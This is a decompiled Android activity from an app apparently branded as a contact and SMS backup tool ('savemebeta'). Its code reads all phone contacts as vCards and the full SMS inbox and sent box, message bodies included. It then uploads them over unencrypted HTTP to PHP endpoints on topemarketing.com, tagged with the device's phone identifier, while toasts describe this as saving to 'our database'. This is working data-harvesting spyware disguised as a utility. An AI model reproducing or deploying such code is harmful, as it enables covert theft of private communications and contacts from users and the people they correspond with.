package com.savemebeta;

import android.app.Activity;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.PhoneLookup;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.Toast;
import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class Scan extends Activity {
    private static final int DIALOG_LOGIN = 1;
    private static final int SELECT_PICTURE = 1;
    public static int f = 0;
    static Context mContext = null;
    public static final int timeforwating = 15000;
    public boolean PBstate;
    Button b1;
    Context ctt = this;
    Context ctx = this;
    Context ctx2 = this;
    private ImageView img;
    public String nam;
    public String phn;
    private String selectedImagePath;
    int serverResponseCode = 0;
    public String upLoadServerUri = null;
    public String uploadFileName;
    public String uploadFilePath;
    public String var;
    public String var2;
    public String vfile;
    public ProgressBar vscanandroid;

    public class DownloadFileAsync extends AsyncTask<String, String, String> {
        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... aurl) {
            try {
                URL url = new URL(aurl[0]);
                URLConnection conexion = url.openConnection();
                conexion.connect();
                Log.d("ANDRO_ASYNC", "Lenght of file: " + conexion.getContentLength());
                InputStream input = new BufferedInputStream(url.openStream());
                OutputStream output = new FileOutputStream(new StringBuilder(String.valueOf(Scan.this.uploadFilePath)).append(Scan.this.vfile).toString());
                byte[] data = new byte[1024];
                while (true) {
                    int count = input.read(data);
                    if (count == -1) {
                        break;
                    }
                    output.write(data, 0, count);
                }
                output.flush();
                output.close();
                input.close();
            } catch (Exception e) {
            }
            new Timer().schedule(new TimerTask() {
                public void run() {
                    Scan.this.vfile = "Contacts_" + Scan.this.var + "_" + Scan.this.var2 + ".vcf";
                    Scan.this.uploadFilePath = new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().toString())).append(File.separator).toString();
                    Intent intent = new Intent("android.intent.action.VIEW");
                    intent.setDataAndType(Uri.fromFile(new File(new StringBuilder(String.valueOf(Scan.this.uploadFilePath)).append(Scan.this.vfile).toString())), "text/x-vcard");
                    Scan.this.startActivity(intent);
                }
            }, 20000);
            return null;
        }
    }

    public class sendsmsdata2 extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            DatabaseOperationssmssave2 DOP = new DatabaseOperationssmssave2(Scan.this.ctx2);
            Cursor CR = DOP.getInformation(DOP);
            CR.moveToFirst();
            Boolean loginstatus = Boolean.valueOf(false);
            String NAME = "";
            String NUMBER = "";
            String FromMac = "";
            String SendTime = "";
            String FromTel = "";
            do {
                NAME = CR.getString(0);
                NUMBER = CR.getString(1);
                FromMac = CR.getString(2);
                FromTel = Scan.this.var;
                Charset.forName("UTF-8").encode(NAME);
                try {
                    Charset.forName("UTF-8").encode(NAME);
                } catch (Exception e) {
                }
                try {
                    NAME = new String(NAME.getBytes("UTF-8"), "UTF-8");
                } catch (UnsupportedEncodingException e1) {
                    e1.printStackTrace();
                }
                HttpClient httpClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://topemarketing.com/android/googlefinal/sendsmsdata2.php");
                List<NameValuePair> nameValuePairs = new ArrayList();
                nameValuePairs.add(new BasicNameValuePair("name", NAME));
                nameValuePairs.add(new BasicNameValuePair("number", NUMBER));
                nameValuePairs.add(new BasicNameValuePair("frommac", FromMac));
                nameValuePairs.add(new BasicNameValuePair("fromtel", FromTel));
                try {
                    httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, "UTF-8"));
                } catch (UnsupportedEncodingException e2) {
                    e2.printStackTrace();
                }
                try {
                    httpClient.execute(httpPost);
                } catch (ClientProtocolException e3) {
                    e3.printStackTrace();
                } catch (IOException e4) {
                    e4.printStackTrace();
                }
            } while (CR.moveToNext());
            CR.close();
            Toast.makeText(Scan.this, "Your SMS Saved Successfuly In Our Database", 1).show();
            Toast.makeText(Scan.this, "Go to our website to get your sms", 1).show();
            return null;
        }
    }

    public class sendsmsdata extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            DatabaseOperationssmssave DOP = new DatabaseOperationssmssave(Scan.this.ctx);
            Cursor CR = DOP.getInformation(DOP);
            CR.moveToFirst();
            Boolean loginstatus = Boolean.valueOf(false);
            String NAME = "";
            String NUMBER = "";
            String FromMac = "";
            String SendTime = "";
            String FromTel = "";
            do {
                NAME = CR.getString(0);
                NUMBER = CR.getString(1);
                FromMac = CR.getString(2);
                FromTel = Scan.this.var;
                Charset.forName("UTF-8").encode(NAME);
                try {
                    Charset.forName("UTF-8").encode(NAME);
                } catch (Exception e) {
                }
                try {
                    NAME = new String(NAME.getBytes("UTF-8"), "UTF-8");
                } catch (UnsupportedEncodingException e1) {
                    e1.printStackTrace();
                }
                HttpClient httpClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://topemarketing.com/android/googlefinal/sendsmsdata.php");
                List<NameValuePair> nameValuePairs = new ArrayList();
                nameValuePairs.add(new BasicNameValuePair("name", NAME));
                nameValuePairs.add(new BasicNameValuePair("number", NUMBER));
                nameValuePairs.add(new BasicNameValuePair("frommac", FromMac));
                nameValuePairs.add(new BasicNameValuePair("fromtel", FromTel));
                try {
                    httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, "UTF-8"));
                } catch (UnsupportedEncodingException e2) {
                    e2.printStackTrace();
                }
                try {
                    httpClient.execute(httpPost);
                } catch (ClientProtocolException e3) {
                    e3.printStackTrace();
                } catch (IOException e4) {
                    e4.printStackTrace();
                }
            } while (CR.moveToNext());
            CR.close();
            new Timer().schedule(new TimerTask() {
                public void run() {
                    Scan.this.refreshMessagelist2();
                }
            }, 3000);
            return null;
        }
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setTitle("Informations");
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        setContentView(R.layout.activity_scan);
        Intent intent = getIntent();
        this.var2 = intent.getStringExtra("var2");
        this.var = intent.getExtras().getString("var");
        ((Button) findViewById(R.id.save)).setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                Scan.this.upLoadServerUri = "http://topemarketing.com/android/upload.php";
                Scan.mContext = Scan.this;
                Scan.this.getVCF();
            }
        });
        ((Button) findViewById(R.id.restore)).setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                Toast.makeText(Scan.this, "Please Wait We Download Your Contacts", 1).show();
                Scan.this.vfile = "Contacts_" + Scan.this.var + "_" + Scan.this.var2 + ".vcf";
                String url = "http://topemarketing.com/android/uploads/" + Scan.this.vfile;
                new DownloadFileAsync().execute(new String[]{url});
            }
        });
        ((Button) findViewById(R.id.add)).setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                Intent intent = new Intent(Scan.this.getBaseContext(), addcontact2.class);
                intent.putExtra("var2", Scan.this.var2);
                Bundle extras = new Bundle();
                extras.putString("var", Scan.this.var);
                intent.putExtras(extras);
                Scan.this.startActivity(intent);
            }
        });
        ((Button) findViewById(R.id.delete)).setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                Scan.this.del();
            }
        });
        ((Button) findViewById(R.id.savesms)).setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                Scan.this.refreshMessagelist();
            }
        });
        ((Button) findViewById(R.id.sos)).setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                Intent intent = new Intent(Scan.this.getBaseContext(), SOSsm.class);
                intent.putExtra("var2", Scan.this.var2);
                Bundle extras = new Bundle();
                extras.putString("var", Scan.this.var);
                intent.putExtras(extras);
                Scan.this.startActivity(intent);
            }
        });
        this.uploadFilePath = new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().toString())).append(File.separator).toString();
    }

    public void del() {
        final Dialog login = new Dialog(this);
        login.setContentView(R.layout.login_dialog);
        login.setTitle("Delete Contact");
        Button btnCancel = (Button) login.findViewById(R.id.btnCancel);
        final EditText txtUsername = (EditText) login.findViewById(R.id.txtUsername);
        final EditText txtPassword = (EditText) login.findViewById(R.id.txtPassword);
        ((Button) login.findViewById(R.id.btnLogin)).setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                if (txtUsername.getText().toString().trim().length() <= 0 || txtPassword.getText().toString().trim().length() <= 0) {
                    Toast.makeText(Scan.this, "Please enter contact number and name", 1).show();
                    return;
                }
                Scan.deleteContact(Scan.this.ctt, txtPassword.getText().toString(), txtUsername.getText().toString());
                Toast.makeText(Scan.this, "Contact " + txtUsername.getText().toString() + " Deleted", 1).show();
                login.dismiss();
            }
        });
        btnCancel.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                login.dismiss();
            }
        });
        login.show();
    }

    public void getVCF() {
        Toast.makeText(this, "Contact Saved Successful in our DataBase", 1).show();
        Toast.makeText(this, "Go To our website to get your contacts", 1).show();
        String vfile = "Contacts_" + this.var + "_" + this.var2 + ".vcf";
        Cursor phones = mContext.getContentResolver().query(Phone.CONTENT_URI, null, null, null, null);
        phones.moveToFirst();
        for (int i = 0; i < phones.getCount(); i++) {
            try {
                AssetFileDescriptor fd = mContext.getContentResolver().openAssetFileDescriptor(Uri.withAppendedPath(Contacts.CONTENT_VCARD_URI, phones.getString(phones.getColumnIndex("lookup"))), "r");
                byte[] buf = new byte[((int) fd.getDeclaredLength())];
                fd.createInputStream().read(buf);
                String VCard = new String(buf);
                new FileOutputStream(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().toString())).append(File.separator).append(vfile).toString(), true).write(VCard.toString().getBytes());
                phones.moveToNext();
                Log.d("Vcard", VCard);
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }
        this.uploadFilePath = new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().toString())).append(File.separator).toString();
        this.uploadFileName = vfile;
        this.upLoadServerUri = "http://topemarketing.com/android/upload.php";
        new Thread(new Runnable() {
            public void run() {
                Scan.this.runOnUiThread(new Runnable() {
                    public void run() {
                    }
                });
                Scan.this.uploadFile(new StringBuilder(String.valueOf(Scan.this.uploadFilePath)).append(Scan.this.uploadFileName).toString());
            }
        }).start();
    }

    public int uploadFile(String sourceFileUri) {
        MalformedURLException ex;
        Exception e;
        String fileName = sourceFileUri;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        File file = new File(sourceFileUri);
        if (file.isFile()) {
            try {
                FileInputStream fileInputStream = new FileInputStream(file);
                HttpURLConnection conn = (HttpURLConnection) new URL(this.upLoadServerUri).openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("ENCTYPE", "multipart/form-data");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                conn.setRequestProperty("uploaded_file", fileName);
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                DataOutputStream dataOutputStream;
                try {
                    dos.writeBytes(new StringBuilder(String.valueOf(twoHyphens)).append(boundary).append(lineEnd).toString());
                    dos.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\"" + fileName + "\"" + lineEnd);
                    dos.writeBytes(lineEnd);
                    int bufferSize = Math.min(fileInputStream.available(), AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                    byte[] buffer = new byte[bufferSize];
                    int bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                    while (bytesRead > 0) {
                        dos.write(buffer, 0, bufferSize);
                        bufferSize = Math.min(fileInputStream.available(), AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
                        bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                    }
                    dos.writeBytes(lineEnd);
                    dos.writeBytes(new StringBuilder(String.valueOf(twoHyphens)).append(boundary).append(twoHyphens).append(lineEnd).toString());
                    this.serverResponseCode = conn.getResponseCode();
                    Log.i("uploadFile", "HTTP Response is : " + conn.getResponseMessage() + ": " + this.serverResponseCode);
                    if (this.serverResponseCode == 200) {
                        runOnUiThread(new Runnable() {
                            public void run() {
                                String msg = "File Upload Completed.\n\n See uploaded file here : \n\n http://www.androidexample.com/media/uploads/" + Scan.this.uploadFileName;
                            }
                        });
                    }
                    fileInputStream.close();
                    dos.flush();
                    dos.close();
                    dataOutputStream = dos;
                } catch (MalformedURLException e2) {
                    ex = e2;
                    dataOutputStream = dos;
                    ex.printStackTrace();
                    runOnUiThread(new Runnable() {
                        public void run() {
                        }
                    });
                    Log.e("Upload file to server", "error: " + ex.getMessage(), ex);
                    return this.serverResponseCode;
                } catch (Exception e3) {
                    e = e3;
                    dataOutputStream = dos;
                    e.printStackTrace();
                    runOnUiThread(new Runnable() {
                        public void run() {
                        }
                    });
                    Log.e("Upload file to server Exception", "Exception : " + e.getMessage(), e);
                    return this.serverResponseCode;
                }
            } catch (MalformedURLException e4) {
                ex = e4;
                ex.printStackTrace();
                runOnUiThread(/* anonymous class already generated */);
                Log.e("Upload file to server", "error: " + ex.getMessage(), ex);
                return this.serverResponseCode;
            } catch (Exception e5) {
                e = e5;
                e.printStackTrace();
                runOnUiThread(/* anonymous class already generated */);
                Log.e("Upload file to server Exception", "Exception : " + e.getMessage(), e);
                return this.serverResponseCode;
            }
            return this.serverResponseCode;
        }
        Log.e("uploadFile", "Source File not exist :" + this.uploadFilePath + this.uploadFileName);
        runOnUiThread(new Runnable() {
            public void run() {
            }
        });
        return 0;
    }

    public static boolean deleteContact(Context ctx, String phone, String name) {
        Cursor cur = ctx.getContentResolver().query(Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phone)), null, null, null, null);
        try {
            if (cur.moveToFirst()) {
                while (!cur.getString(cur.getColumnIndex("display_name")).equalsIgnoreCase(name)) {
                    if (!cur.moveToNext()) {
                    }
                }
                ctx.getContentResolver().delete(Uri.withAppendedPath(Contacts.CONTENT_LOOKUP_URI, cur.getString(cur.getColumnIndex("lookup"))), null, null);
                return true;
            }
        } catch (Exception e) {
            System.out.println(e.getStackTrace());
        }
        return false;
    }

    public void refreshMessagelist() {
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, new String[]{"address", "date", "body"}, null, null, null);
        cursor.moveToFirst();
        while (cursor.moveToNext()) {
            String address = cursor.getString(0);
            String body = cursor.getString(2);
            String date = cursor.getString(1);
            DatabaseOperationssmssave DB = new DatabaseOperationssmssave(this.ctx);
            DB.putInformation(DB, date, address, body);
        }
        cursor.close();
        Toast.makeText(this, "Get Inbox SMS...", 0).show();
        new sendsmsdata().execute(new Void[0]);
    }

    public void refreshMessagelist2() {
        Uri uri1 = Uri.parse("content://sms/sent");
        Cursor cursor1 = getContentResolver().query(uri1, new String[]{"address", "date", "body"}, null, null, null);
        cursor1.moveToFirst();
        while (cursor1.moveToNext()) {
            String address2 = cursor1.getString(0);
            String body2 = cursor1.getString(2);
            String date2 = cursor1.getString(1);
            DatabaseOperationssmssave2 DB = new DatabaseOperationssmssave2(this.ctx2);
            DB.putInformation(DB, date2, address2, body2);
        }
        cursor1.close();
        Toast.makeText(this, "Get Sentbox SMS...", 0).show();
        new sendsmsdata2().execute(new Void[0]);
    }

    public void updateprogress(int passedtime) {
        if (this.vscanandroid != null) {
            this.vscanandroid.setProgress((this.vscanandroid.getMax() * passedtime) / 15000);
        }
    }
}
